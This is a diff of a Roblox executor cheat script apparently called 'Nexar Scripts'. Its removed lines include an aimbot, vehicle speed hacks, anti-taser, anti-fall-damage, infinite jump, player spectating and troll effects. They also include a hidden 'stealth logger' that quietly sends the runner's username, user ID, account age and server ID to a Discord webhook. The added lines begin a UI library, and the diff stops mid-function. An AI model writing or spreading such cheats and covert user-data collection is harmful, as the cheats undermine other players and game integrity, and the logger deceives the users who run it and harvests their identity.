-                if originalAttrs[lastVehicleRef] then
-                    for attrName, orig in pairs(originalAttrs[lastVehicleRef]) do
-                        lastVehicleRef:SetAttribute(attrName, orig)
-                    end
-                end
-            end)
-            originalAttrs[lastVehicleRef] = nil
-            lastVehicleRef = nil
-        end
-    end
-})
-
-
-local ATTRS_TO_MULT = {
-    "MaxSpeed",
-    "ReverseMaxSpeed",
-    "MaxAccelerateForce",
-    "MaxBrakeForce"
-}
-
-local function saveAndApplyAttributes(vehicle, mult)
-    if not vehicle then return false end
-    originalAttrs[vehicle] = originalAttrs[vehicle] or {}
-    local applied = false
-    for _, attrName in ipairs(ATTRS_TO_MULT) do
-        local val = vehicle:GetAttribute(attrName)
-        if val ~= nil then
-           
-            if originalAttrs[vehicle][attrName] == nil then
-                originalAttrs[vehicle][attrName] = val
-            end
-            
-            local newVal = originalAttrs[vehicle][attrName] * mult
-            vehicle:SetAttribute(attrName, newVal)
-            applied = true
-        end
-    end
-    return applied
-end
-
-local function restoreAttributes(vehicle)
-    if not vehicle or not originalAttrs[vehicle] then return end
-    for attrName, orig in pairs(originalAttrs[vehicle]) do
-        pcall(function() vehicle:SetAttribute(attrName, orig) end)
-    end
-    originalAttrs[vehicle] = nil
-end
-
-
-local function applyVelocityFallback(seat, mult, dt)
-    if not seat then return end
-    local currentVel = seat.AssemblyLinearVelocity
-    local forward = seat.CFrame.LookVector
-    local forwardSpeed = forward:Dot(currentVel)
-
-    
-
-    local bonus = 40 * (mult - 1) 
-    local targetVel = forward * (math.max(forwardSpeed, 0) + bonus)
-
-  
-    local newVel = currentVel:Lerp(targetVel, math.clamp(5 * dt, 0, 1))
-    seat.AssemblyLinearVelocity = newVel
-end
-
-
-RunService.Heartbeat:Connect(function(dt)
-    if not accelEnabled then return end
-
-   
-    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
-    local vehicle = vehiclesFolder and vehiclesFolder:FindFirstChild(player.Name)
-
-    if vehicle and vehicle:IsA("Model") then
-        lastVehicleRef = vehicle
-
-        
-        local applied = false
-        pcall(function() applied = saveAndApplyAttributes(vehicle, accelMultiplier) end)
-
-     
-        if applied then
-       
-            return
-        end
-    end
-
-    
-    if vehicle then
-        local seat = vehicle:FindFirstChild("DriveSeat") or vehicle:FindFirstChildWhichIsA("VehicleSeat")
-        if seat and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
-            local hum = player.Character:FindFirstChildOfClass("Humanoid")
-            if hum.SeatPart == seat and UIS:IsKeyDown(Enum.KeyCode.W) then
-           
-                pcall(function() applyVelocityFallback(seat, accelMultiplier, dt) end)
-            end
-        end
-    end
-end)
-
-
-workspace.ChildRemoved:Connect(function(child)
-    if lastVehicleRef and child == lastVehicleRef then
-        restoreAttributes(lastVehicleRef)
-        lastVehicleRef = nil
-    end
-end)
-
-
-
-
-
-
---Anti Tasser
-
-local AntiTaserEnabled = false
-MiscTab:AddToggle({
-    Name = "Anti-Taser",
-    Default = false,
-    Callback = function(val)
-        AntiTaserEnabled = val
-    end
-})
-
-     game:GetService("RunService").Heartbeat:Connect(function()
-        if AntiTaserEnabled then
-            local char = game.Players.LocalPlayer.Character
-            if char and char:GetAttribute("Tased") == true then
-                char:SetAttribute("Tased", false)
-        end
-    end
-end)
-
-
-
-
-
-
-
---spectaten
-
---------------------------------------------------------------------
--- // SPECTATE (FIXED – KEINE FEHLER MEHR!)
---------------------------------------------------------------------
-
--- Erstelle Spectate Tab
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
-local LocalPlayer = Players.LocalPlayer
-
-local spectateTarget = nil
-local dropdown = nil
-
--- Aktualisiere Spielerliste
-local function updatePlayers()
-    local list = { "Keiner" }
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then
-            table.insert(list, plr.Name .. " (" .. plr.DisplayName .. ")")
-        end
-    end
-    if dropdown then
-        dropdown:Refresh(list, true)
-    end
-end
-
--- RICHTIGE METHODE: AddDropdown (nicht MakeDropdown!)
-dropdown = TrollTab:AddDropdown({
-    Name = "Chosse player",
-    Options = { "Noone" },
-    Default = "Noone",
-    Callback = function(value)
-        if value == "Noone" then
-            spectateTarget = nil
-            Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-            return
-        end
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr ~= LocalPlayer and value:find(plr.Name) then
-                spectateTarget = plr
-                break
-            end
-        end
-    end
-})
-
--- Auto-Refresh alle 1 Sekunde
-task.spawn(function()
-    while task.wait(1) do
-        pcall(updatePlayers)
-    end
-end)
-
--- Stop Button
-TrollTab:AddButton({
-    Name = "Stop Spectate",
-    Callback = function()
-        spectateTarget = nil
-        dropdown:Set("Noone")
-        Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-    end
-})
-
--- Spectate Loop
-RunService.RenderStepped:Connect(function()
-    if spectateTarget and spectateTarget.Character then
-        local hrp = spectateTarget.Character:FindFirstChild("HumanoidRootPart")
-        local hum = spectateTarget.Character:FindFirstChildOfClass("Humanoid")
-        if hrp and hum and hum.Health > 0 then
-            Camera.CameraSubject = hum
-            Camera.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 5, 10), hrp.Position)
-        else
-            spectateTarget = nil
-            dropdown:Set("Keiner")
-        end
-    end
-end)
-
--- Respawn Fix
-LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(1)
-    if not spectateTarget then
-        Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-    end
-end)
-
--- Notification
-OrionLib:MakeNotification({
-    Name = "Spectate Ready!",
-    Content = "Dropdown refresht alle 1s",
-    Time = 4
-})
-
-
-
-
---anti fall
-
---------------------------------------------------------------------
--- // ANTI-FALL DAMAGE (EINFACH & FEHLERFREI)
---------------------------------------------------------------------
-
-local AntiFallEnabled = false
-local antiFallConnection
-
-MiscTab:AddToggle({
-    Name = "Anti Fall Damage",
-    Default = false,
-    Callback = function(value)
-        AntiFallEnabled = value
-        
-        if value then
-            -- Verlangsame Fallgeschwindigkeit
-            antiFallConnection = game:GetService("RunService").Stepped:Connect(function()
-                local character = LP.Character
-                if character then
-                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                    local humanoid = character:FindFirstChildOfClass("Humanoid")
-                    
-                    if humanoidRootPart and humanoid then
-                        -- Wenn fällt (Y-Velocity negativ) -> Verlangsamen
-                        if humanoidRootPart.AssemblyLinearVelocity.Y < -20 then
-                            humanoidRootPart.AssemblyLinearVelocity = Vector3.new(
-                                humanoidRootPart.AssemblyLinearVelocity.X,
-                                -16,  -- Sanft -16 (kein Schaden!)
-                                humanoidRootPart.AssemblyLinearVelocity.Z
-                            )
-                        end
-                    end
-                end
-            end)
-        else
-            if antiFallConnection then
-                antiFallConnection:Disconnect()
-            end
-        end
-    end
-})
-
-
-
-
---Aimbot Anfang
-
-
-
-local AimbotEnabled = false
-local AimPart = "Head"              
-local AimbotFOV = 100
-local AimbotSmoothnessUI = 5         
-local AimbotSmoothness = AimbotSmoothnessUI / 10 
-local AimbotMaxDistance = 500
-local AimbotKey = Enum.KeyCode.L
-local FOVCircleVisible = true
-local PredictionEnabled = false
-local PredictionFactor = 0.0575
-
-
-local MobileAimbotEnabled = false
-local aimbotGui, aimbotButton
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local Camera = workspace.CurrentCamera
-local LocalPlayer = Players.LocalPlayer
-
-
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Visible = false
-FOVCircle.Radius = AimbotFOV
-FOVCircle.Color = Color3.fromRGB(255, 0, 0)
-FOVCircle.Thickness = 1.5
-FOVCircle.Transparency = 0.7
-FOVCircle.Filled = false
-FOVCircle.Position = UserInputService:GetMouseLocation()
-
-
-AimbotTab:AddToggle({
-    Name = "Enable Aimbot",
-    Default = false,
-    Callback = function(val)
-        AimbotEnabled = val
-        FOVCircle.Visible = AimbotEnabled and FOVCircleVisible
-    end
-})
-
-AimbotTab:AddToggle({
-    Name = "Mobile Aimbot",
-    Default = false,
-    Callback = function(val)
-        MobileAimbotEnabled = val
-        if MobileAimbotEnabled then
-            
-            if not aimbotGui then
-                aimbotGui = Instance.new("ScreenGui")
-                aimbotGui.Name = "MobileAimbotGui"
-                aimbotGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-                aimbotButton = Instance.new("TextButton")
-                aimbotButton.Size = UDim2.new(0, 200, 0, 50)
-                aimbotButton.Position = UDim2.new(0.5, -100, 0.8, 0)
-                aimbotButton.Text = "Aimbot: OFF"
-                aimbotButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-                aimbotButton.TextColor3 = Color3.fromRGB(255,255,255)
-                aimbotButton.Font = Enum.Font.SourceSans
-                aimbotButton.TextSize = 20
-                aimbotButton.Parent = aimbotGui
-                Instance.new("UICorner", aimbotButton)
-
-                aimbotButton.MouseButton1Click:Connect(function()
-                    AimbotEnabled = not AimbotEnabled
-                    if AimbotEnabled then
-                        aimbotButton.Text = "Aimbot: ON"
-                        aimbotButton.BackgroundColor3 = Color3.fromRGB(0,255,0)
-                    else
-                        aimbotButton.Text = "Aimbot: OFF"
-                        aimbotButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
-                    end
-                    FOVCircle.Visible = AimbotEnabled and FOVCircleVisible
-                end)
-
-         
-                local dragging, dragStart, startPos = false, nil, nil
-                aimbotButton.InputBegan:Connect(function(input)
-                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                        dragging = true
-                        dragStart = input.Position
-                        startPos = aimbotButton.Position
-                    end
-                end)
-                aimbotButton.InputChanged:Connect(function(input)
-                    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-                        local delta = input.Position - dragStart
-                        aimbotButton.Position = UDim2.new(
-                            startPos.X.Scale,
-                            startPos.X.Offset + delta.X,
-                            startPos.Y.Scale,
-                            startPos.Y.Offset + delta.Y
-                        )
-                    end
-                end)
-                aimbotButton.InputEnded:Connect(function(input)
-                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                        dragging = false
-                    end
-                end)
-            end
-        else
-           
-            if aimbotGui then
-                aimbotGui:Destroy()
-                aimbotGui = nil
-                aimbotButton = nil
-            end
-        end
-    end
-})
-
-AimbotTab:AddBind({
-    Name = "Aimbot Key",
-    Default = AimbotKey,
-    Hold = false,
-    Callback = function()
-        AimbotEnabled = not AimbotEnabled
-        FOVCircle.Visible = AimbotEnabled and FOVCircleVisible
-    end
-})
-
-AimbotTab:AddDropdown({
-    Name = "Aim Part",
-    Default = "Head",
-    Options = {"Head", "HumanoidRootPart"},
-    Callback = function(value)
-        AimPart = value
-    end
-})
-
-AimbotTab:AddSlider({
-    Name = "FOV Size",
-    Min = 10,
-    Max = 300,
-    Default = AimbotFOV,
-    Callback = function(value)
-        AimbotFOV = value
-        FOVCircle.Radius = value
-    end
-})
-
-AimbotTab:AddColorpicker({
-    Name = "FOV Color",
-    Default = Color3.fromRGB(255,0,0),
-    Callback = function(value)
-        FOVCircle.Color = value
-    end
-})
-
-AimbotTab:AddToggle({
-    Name = "Show FOV",
-    Default = FOVCircleVisible,
-    Callback = function(value)
-        FOVCircleVisible = value
-        FOVCircle.Visible = AimbotEnabled and value
-    end
-})
-
-AimbotTab:AddSlider({
-    Name = "Max Distance",
-    Min = 10,
-    Max = 2000,
-    Default = AimbotMaxDistance,
-    Callback = function(value)
-        AimbotMaxDistance = value
-    end
-})
-
-AimbotTab:AddSlider({
-    Name = "Smoothness (1=slow / 10=fast)",
-    Min = 1,
-    Max = 10,
-    Default = AimbotSmoothnessUI,
-    Increment = 1,
-    Callback = function(value)
-        AimbotSmoothnessUI = value
-        AimbotSmoothness = math.clamp(value / 10, 0.01, 1)
-    end
-})
-
-AimbotTab:AddToggle({
-    Name = "Prediction",
-    Default = PredictionEnabled,
-    Callback = function(value)
-        PredictionEnabled = value
-    end
-})
-
-AimbotTab:AddSlider({
-    Name = "Prediction Factor",
-    Min = 0,
-    Max = 0.5,
-    Default = PredictionFactor,
-    Increment = 0.005,
-    Callback = function(value)
-        PredictionFactor = value
-    end
-})
-
-
-local function get_target_part(char)
-    if not char then return nil end
-    return char:FindFirstChild(AimPart) or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
-end
-
-local function get_predicted_position(part)
-    if not part then return nil end
-    if not PredictionEnabled then return part.Position end
-    local vel = part.Velocity or Vector3.new(0,0,0)
-    local predict = Vector3.new(vel.X, math.clamp(vel.Y * 0.5, -5, 10), vel.Z) * PredictionFactor
-    return part.Position + predict
-end
-
-local function GetClosestPlayer()
-    local closest = nil
-    local shortestDist = AimbotFOV
-    local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not localRoot then return nil end
-
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer and plr.Character and plr.Character.Parent then
-            local targetPart = get_target_part(plr.Character)
-            if targetPart then
-                local pos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
-                if onScreen then
-                    local mousePos = UserInputService:GetMouseLocation()
-                    local dist = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
-                    local mag = (plr.Character.HumanoidRootPart.Position - localRoot.Position).Magnitude
-                    if dist <= shortestDist and mag <= AimbotMaxDistance then
-                        shortestDist = dist
-                        closest = plr
-                    end
-                end
-            end
-        end
-    end
-    return closest
-end
-
-
-RunService:BindToRenderStep("AimbotRenderStep", Enum.RenderPriority.Camera.Value + 1, function(delta)
-
-    if FOVCircle then
-        FOVCircle.Position = UserInputService:GetMouseLocation()
-        FOVCircle.Radius = AimbotFOV
-    end
-
-    if not AimbotEnabled then return end
-    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
-
-    local targetPlayer = GetClosestPlayer()
-    if not targetPlayer or not targetPlayer.Character then return end
-
-    local targetPart = get_target_part(targetPlayer.Character)
-    if not targetPart then return end
-
-    local aimPos = get_predicted_position(targetPart)
-    if not aimPos then return end
-
-    local camPos = Camera.CFrame.Position
-    local desiredCFrame = CFrame.new(camPos, aimPos)
-
-
-    local alpha = AimbotSmoothness
-    local lerpAlpha = math.clamp(alpha * math.clamp(delta * 60, 0.01, 1), 0.01, 1)
-
-    Camera.CFrame = Camera.CFrame:Lerp(desiredCFrame, lerpAlpha)
-end)
-
--- Cleanup on script disable/unload (optional)
-local function cleanupAimbot()
-    if FOVCircle and FOVCircle.Visible then
-        FOVCircle.Visible = false
-    end
-    if aimbotGui then
-        aimbotGui:Destroy()
-        aimbotGui = nil
-        aimbotButton = nil
-    end
-  
-    pcall(function() RunService:UnbindFromRenderStep("AimbotRenderStep") end)
-end
-
-_G.MyAimbot = {
-    Enable = function() AimbotEnabled = true; FOVCircle.Visible = FOVCircleVisible end,
-    Disable = function() AimbotEnabled = false; FOVCircle.Visible = false end,
-    Cleanup = cleanupAimbot
-}
-
-
-
-
-
-
-
-
---crosshair Anfang (spinabel)
-
-
-
---------------------------------------------------------------------
--- // DREHENDES CROSSHAIR (FIXED: DREHT WIEDER + ABSTAND BUG FIX!)
---------------------------------------------------------------------
-
-local CrosshairEnabled = false
-local crosshairGui = nil
-local rotation = 0
-local rotationSpeed = 5
-local crosshairSize = 20
-local lineGap = 8  -- Abstand vom Zentrum (Gap)
-local crosshairColor = Color3.fromRGB(255, 255, 255)
-
-local lines = {}  -- Global für Live-Updates
-local mainFrameRef = nil
-
--- Erstelle Crosshair GUI
-local function createCrosshair()
-    crosshairGui = Instance.new("ScreenGui")
-    crosshairGui.Name = "NexarCrosshair"
-    crosshairGui.ResetOnSpawn = false
-    crosshairGui.Parent = game.CoreGui
-    
-    mainFrameRef = Instance.new("Frame")
-    mainFrameRef.Name = "CrosshairFrame"
-    mainFrameRef.Size = UDim2.new(0, crosshairSize * 2, 0, crosshairSize * 2)
-    mainFrameRef.Position = UDim2.new(0.5, -crosshairSize, 0.5, -crosshairSize)
-    mainFrameRef.BackgroundTransparency = 1
-    mainFrameRef.Parent = crosshairGui
-    
-    lines = {}  -- Reset lines
-    
-    -- 4 DREHENDE Linien (richtig positioniert)
-    for i = 1, 4 do
-        local line = Instance.new("Frame")
-        line.Name = "Line" .. i
-        line.Size = UDim2.new(0, 3, 0, crosshairSize - lineGap)  -- Länge = Size - Gap
-        line.BackgroundColor3 = crosshairColor
-        line.BorderSizePixel = 0
-        line.AnchorPoint = Vector2.new(0.5, 0.5)
-        line.Position = UDim2.new(0.5, 0, 0.5, 0)
-        line.Rotation = (i-1) * 90
-        
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0, 1.5)
-        corner.Parent = line
-        
-        line.Parent = mainFrameRef
-        table.insert(lines, line)
-    end
-    
-    -- NEXAR TEXT (STILL!)
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Name = "NexarText"
-    textLabel.Size = UDim2.new(0, 120, 0, 25)
-    textLabel.Position = UDim2.new(0.5, -60, 0.5, crosshairSize + 10)
-    textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    textLabel.BackgroundTransparency = 0.3
-    textLabel.Text = "Nexar Scripts"
-    textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-    textLabel.TextScaled = true
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.Parent = mainFrameRef
-    
-    local textCorner = Instance.new("UICorner")
-    textCorner.CornerRadius = UDim.new(0, 8)
-    textCorner.Parent = textLabel
-    
-    return mainFrameRef
-end
-
--- Toggle (FIXED ROTATION!)
-MiscTab:AddToggle({
-    Name = "Rotierendes Crosshair",
-    Default = false,
-    Callback = function(enabled)
-        CrosshairEnabled = enabled
-        
-        if enabled then
-            createCrosshair()
-            notify("Crosshair", "AKTIV - DREHT!")
-            
-            -- FIXED ROTATION LOOP
-            local rotConnection = game:GetService("RunService").RenderStepped:Connect(function()
-                if not CrosshairEnabled or not mainFrameRef then
-                    rotConnection:Disconnect()
-                    return
-                end
-                
-                rotation = rotation + rotationSpeed
-                if rotation >= 360 then rotation = 0 end
-                
-                -- DREHE JEDER LINE INDIVIDUELL!
-                for i, line in pairs(lines) do
-                    line.Rotation = ((i-1) * 90 + rotation) % 360
-                end
-            end)
-        else
-            if crosshairGui then
-                crosshairGui:Destroy()
-                crosshairGui = nil
-                mainFrameRef = nil
-                lines = {}
-            end
-            notify("Crosshair", "OFF")
-        end
-    end
-})
-
--- Größe Slider (FIXED)
-MiscTab:AddSlider({
-    Name = "Crosshair Größe",
-    Min = 10,
-    Max = 50,
-    Default = 20,
-    Increment = 2,
-    ValueName = "px",
-    Callback = function(size)
-        crosshairSize = size
-        if mainFrameRef then
-            mainFrameRef.Size = UDim2.new(0, size * 2, 0, size * 2)
-            mainFrameRef.Position = UDim2.new(0.5, -size, 0.5, -size)
-            -- Update Linienlänge
-            for _, line in pairs(lines) do
-                line.Size = UDim2.new(0, 3, 0, size - lineGap)
-            end
-        end
-    end
-})
-
--- ABSTAND SLIDER (FIXED: Gap vom Zentrum)
-MiscTab:AddSlider({
-    Name = "Linien Abstand",
-    Min = 0,
-    Max = 20,
-    Default = 8,
-    Increment = 1,
-    ValueName = "Gap",
-    Callback = function(gap)
-        lineGap = gap
-        if mainFrameRef then
-            for _, line in pairs(lines) do
-                line.Size = UDim2.new(0, 3, 0, crosshairSize - gap)
-            end
-        end
-    end
-})
-
--- Farbe Slider (FIXED)
-MiscTab:AddColorpicker({
-    Name = "Crosshair Farbe",
-    Default = crosshairColor,
-    Callback = function(color)
-        crosshairColor = color
-        if mainFrameRef then
-            for _, line in pairs(lines) do
-                line.BackgroundColor3 = color
-            end
-        end
-    end
-})
-
--- Speed Slider
-MiscTab:AddSlider({
-    Name = "Dreh-Geschwindigkeit",
-    Min = 1,
-    Max = 20,
-    Default = 5,
-    Increment = 0.5,
-    ValueName = "°/s",
-    Callback = function(speed)
-        rotationSpeed = speed
-    end
-})
-
-
-
-
---infinity jump
-
--- === 2. INFINITE JUMP (HOCH SPRINGEN) ===
-local infJump = false
-MiscTab:AddToggle({
-    Name = "Infinite Jump",
-    Default = false,
-    Callback = function(v)
-        infJump = v
-        if v then
-            UIS.InputBegan:Connect(function(input)
-                if infJump and input.KeyCode == Enum.KeyCode.Space then
-                    local char = LP.Character
-                    if char then
-                        local hum = char:FindFirstChildOfClass("Humanoid")
-                        if hum then
-                            hum:ChangeState(Enum.HumanoidStateType.Jumping)
-                        end
-                    end
-                end
-            end)
-        end
-    end
-})
-
-
-
--- === 8. FPS BOOST (OPTIMIERUNG) ===
-MiscTab:AddButton({
-    Name = "FPS Boost",
-    Callback = function()
-        for _, v in pairs(workspace:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.Material = Enum.Material.Plastic
-                v.Reflectance = 0
-            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                v.Enabled = false
-            end
-        end
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-        notify("FPS Boost", "Grafik reduziert – MEHR FPS!")
-    end
-})
-
-
-
-               
-
-
-
-
-
--- === 9. FAKE KICK (KICK MELDUNG) ===
-TrollTab:AddButton({
-    Name = "Fake Kick",
-    Callback = function()
-        LocalPlayer:Kick("You have been kicked from Nexar Scripts")
-    end
-})
-
-
-
-
-
--- === 7. INVISIBLE PARTS (GLASIG) ===
-TrollTab:AddToggle({
-    Name = "Glass Char",
-    Default = false,
-    Callback = function(v)
-        local char = LP.Character
-        if char then
-            for _, part in pairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.Transparency = v and 0.7 or 0
-                    part.Material = v and Enum.Material.Glass or Enum.Material.SmoothPlastic
-                end
-            end
-        end
-    end
-})
-
-
-
--- === 9. FLAMMENDER CHAR (FEUER EFFEKTE) ===
-TrollTab:AddButton({
-    Name = "Fire Char",
-    Callback = function()
-        local char = LP.Character
-        if char then
-            for _, part in pairs(char:GetChildren()) do
-                if part:IsA("BasePart") then
-                    local fire = Instance.new("Fire")
-                    fire.Size = 10
-                    fire.Heat = 15
-                    fire.Color = Color3.fromRGB(255, 100, 0)
-                    fire.Parent = part
-                end
-            end
-            notify("Fire", "DU BRENNT!")
-        end
-    end
-})
-
-
-
-
-
--- === 10. SMOKE TRAIL (RAUCHSPUR) ===
-TrollTab:AddToggle({
-    Name = "Smoke Trail",
-    Default = false,
-    Callback = function(v)
-        local char = LP.Character
-        if char and char:FindFirstChild("HumanoidRootPart") then
-            local hrp = char.HumanoidRootPart
-            local smoke = hrp:FindFirstChild("SmokeTrail")
-            if v then
-                if not smoke then
-                    smoke = Instance.new("Smoke")
-                    smoke.Name = "SmokeTrail"
-                    smoke.Opacity = 0.5
-                    smoke.RiseVelocity = 10
-                    smoke.Color = Color3.fromRGB(100, 100, 100)
-                    smoke.Parent = hrp
-                end
-            else
-                if smoke then smoke:Destroy() end
-            end
-        end
-    end
-})
-
-
-
-
--- === 5. ZERSETZEN (PARTIKEL REGEN) ===
-TrollTab:AddToggle({
-    Name = "Particle Rain",
-    Default = false,
-    Callback = function(v)
-        local char = LP.Character
-        if char then
-            for _, part in pairs(char:GetChildren()) do
-                if part:IsA("BasePart") then
-                    local attach = part:FindFirstChild("ParticleAttachment")
-                    if v then
-                        if not attach then
-                            attach = Instance.new("Attachment")
-                            attach.Name = "ParticleAttachment"
-                            attach.Parent = part
-                        end
-                        local particles = Instance.new("ParticleEmitter")
-                        particles.Texture = "rbxassetid://241650934"
-                        particles.Lifetime = NumberRange.new(1, 3)
-                        particles.Rate = 50
-                        particles.SpreadAngle = Vector2.new(360, 360)
-                        particles.Speed = NumberRange.new(5)
-                        particles.Parent = attach
-                        particles.Enabled = true
-                    else
-                        if attach then
-                            for _, child in pairs(attach:GetChildren()) do
-                                child:Destroy()
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-})
-
-
-
-
-
-
-
-
-
-
---------------------------------------------------------------------
--- // NEXAR STEALTH DISCORD LOGGER (FÜR EXECUTORS – KEIN STUDIO!)
---------------------------------------------------------------------
-
--- === DEINE DISCORD WEBHOOK URL HIER EINFÜGEN! ===
-local WEBHOOK_URL = "https://discord.com/api/webhooks/DEINE_WEBHOOK_URL_HIER"
-
---------------------------------------------------------------------
--- // WICHTIG: NUR IN EXECUTOR (Synapse, Krnl, Fluxus, etc.) LÄUFT! //
---------------------------------------------------------------------
-
--- Prüfe HttpService
-if not syn or not syn.request then
-    warn("Dieses Script läuft NUR in einem Executor mit HTTP-Support!")
-    return
-end
-
--- Warte auf LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-if not LocalPlayer then return end
+local Mouse = LocalPlayer:GetMouse()
 
--- Warte auf Charakter
-local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local hrp = char:WaitForChild("HumanoidRootPart", 10)
-if not hrp then return end
-
--- Spielname holen
-local gameName = "Unbekanntes Spiel"
-pcall(function()
-    local MarketplaceService = game:GetService("MarketplaceService")
-    local info = MarketplaceService:GetProductInfo(game.PlaceId)
-    if info and info.Name then
-        gameName = info.Name
-    end
-end)
-
--- Aktuelle Zeit (UTC)
-local currentTime = os.date("!%Y-%m-%d %H:%M:%S UTC")
-
--- Embed-Daten
-local embed = {
-    title = "Nexar Script Executed!",
-    description = "**Ein User hat das Script gerade ausgeführt!**",
-    color = 16711680,  -- Rot
-    fields = {
-        {name = "Spieler", value = LocalPlayer.Name, inline = true},
-        {name = "Display Name", value = LocalPlayer.DisplayName, inline = true},
-        {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
-        {name = "Account Alter", value = tostring(LocalPlayer.AccountAge) .. " Tage", inline = true},
-        {name = "Ausführungszeit", value = currentTime, inline = true},
-        {name = "Spiel", value = gameName, inline = false},
-        {name = "Server ID", value = game.JobId, inline = false},
-        {name = "Executor", value = (syn and "Synapse X") or (Krnl and "Krnl") or (getexecutorname and getexecutorname()) or "Unbekannt", inline = true}
-    },
-    thumbnail = {
-        url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
-    },
-    footer = {
-        text = "Nexar Stealth Logger • Executor Mode"
-    },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+local Library = {
+Elements = {},
+ThemeObjects = {},
+Connections = {},
+Flags = {},
+Themes = {
+Default = {
+Main = Color3.fromRGB(20, 20, 22),
+Second = Color3.fromRGB(30, 30, 32),
+Stroke = Color3.fromRGB(60, 60, 65),
+Divider = Color3.fromRGB(40, 40, 45),
+Text = Color3.fromRGB(240, 240, 245),
+TextDark = Color3.fromRGB(160, 160, 165)
+}
+},
+SelectedTheme = "Default",
+Folder = nil,
+SaveCfg = false,
+Font = Enum.Font.Gotham
 }
 
-local data = {
-    content = nil,
-    embeds = {embed}
-}
+-- Remove external HTTP requests and icons
+local function GetIcon(IconName)
+return nil
+end
 
--- Senden via syn.request (für Executor)
-local success, response = pcall(function()
-    return syn.request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode(data)
-    })
-end)
+function Library:CleanupInstance()
+for _, instance in pairs(game:GetService("CoreGui"):GetChildren()) do
+if instance:IsA("ScreenGui") and
+instance.Name:match("^[A-Z]%d%d%d$") then
+instance:Destroy()
+end
+end
+end
 
--- Ergebnis
-if success and response.StatusCode == 200 or response.StatusCode == 204 then
-    print("[Nexar Logger] User erfolgreich an Discord gesendet!")
-else
-    warn("[Nexar Logger] Fehler: " .. tostring(response and response.StatusCode or "Unbekannt"))
+Library:CleanupInstance()
+local Container = Instance.new("ScreenGui")
+Container.Name = string.char(math.random(65, 90))..tostring(math.random(100, 999))
+Container.DisplayOrder = 2147483647
+Container.Parent = game:GetService("CoreGui")
+
+function Library:IsRunning()
+return Container and Container.Parent == game:GetService("CoreGui")
+end
+
+local function AddConnection(Signal, Function)
+if (not Library:IsRunning()) then
+return
+end
+local SignalConnect = Signal:Connect(Function)
+table.insert(Library.Connections, SignalConnect)
+return SignalConnect
+end
+
+task.spawn(function()
+while (Library:IsRunning()) do
+wait()
 end
 
 
+for _, Connection in next, Library.Connections do
+	Connection:Disconnect()
+end
+end)
+
+local function MakeDraggable(DragPoint, Main)
+pcall(function()
+local Dragging, DragInput, MousePos, FramePos = false
+DragPoint.InputBegan:Connect(function(Input)
+if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+Dragging = true
+MousePos = Input.Position
+FramePos = Main.Position
 
 
+            Input.Changed:Connect(function()
+                if Input.UserInputState == Enum.UserInputState.End then
+                    Dragging = false
+                end
+            end)
+        end
+    end)
+    DragPoint.InputChanged:Connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
+            DragInput = Input
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(Input)
+        if Input == DragInput and Dragging then
+            local Delta = Input.Position - MousePos
+            TweenService:Create(Main, TweenInfo.new(0.65, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+                Position = UDim2.new(FramePos.X.Scale, FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)
+            }):Play()
+        end
+    end)
+end)
+end
 
---no car damage
+local function Create(Name, Properties, Children)
+local Object = Instance.new(Name)
+for i, v in next, Properties or {} do
+Object[i] = v
+end
+for i, v in next, Children or {} do
+v.Parent = Object
+end
+return Object
+end
+
+local function CreateElement(ElementName, ElementFunction)
